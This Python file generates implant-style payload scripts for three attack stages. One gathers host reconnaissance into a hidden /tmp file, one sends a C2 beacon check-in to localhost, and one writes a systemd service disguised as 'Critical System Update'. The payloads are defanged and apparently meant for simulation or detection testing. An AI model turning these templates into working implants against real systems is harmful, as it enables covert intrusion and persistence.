import time
import os

def get_recon_payload():
    timestamp = time.time()
    # Real python code that runs standard library commands
    return f"""
import os
import platform
import time
import json
import socket

# TARGET: RECON
# TIMESTAMP: {timestamp}

try:
    data = {{
        'system': platform.uname().system,
        'node': platform.uname().node,
        'release': platform.uname().release,
        'version': platform.uname().version,
        'machine': platform.uname().machine,
        'processor': platform.uname().processor,
        'uid': os.getuid(),
        'cwd': os.getcwd(),
        'hostname': socket.gethostname()
    }}

    # Write to a hidden file
    out_file = f"/tmp/.recon_data_{int(timestamp)}.json"
    with open(out_file, 'w') as f:
        json.dump(data, f, indent=2)
except Exception:
    pass
"""

def get_beacon_payload():
    timestamp = time.time()
    # Tries to connect to a port (Switch or arbitrary)
    return f"""
import socket
import time

# TARGET: C2 BEACON
# TIMESTAMP: {timestamp}

C2_HOST = '127.0.0.1'
C2_PORT = 10000 # Trying the vnet switch port or similar

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    s.connect((C2_HOST, C2_PORT))
    s.sendall(b"IMPLANT_CHECKIN:{timestamp}")
    s.close()
except Exception:
    pass
"""

def get_persistence_payload():
    timestamp = time.time()
    # Writes a fake systemd service file
    return f"""
import os

# TARGET: PERSISTENCE
# TIMESTAMP: {timestamp}

target = "/tmp/.fake_service_{int(timestamp)}.service"
content = \"\"\"[Unit]
Description=Critical System Update
After=network.target

[Service]
ExecStart=/usr/bin/python3 -c "while True: import time; time.sleep(100)"
Restart=always

[Install]
WantedBy=multi-user.target
\"\"\"

try:
    with open(target, 'w') as f:
        f.write(content)
except Exception:
    pass
"""
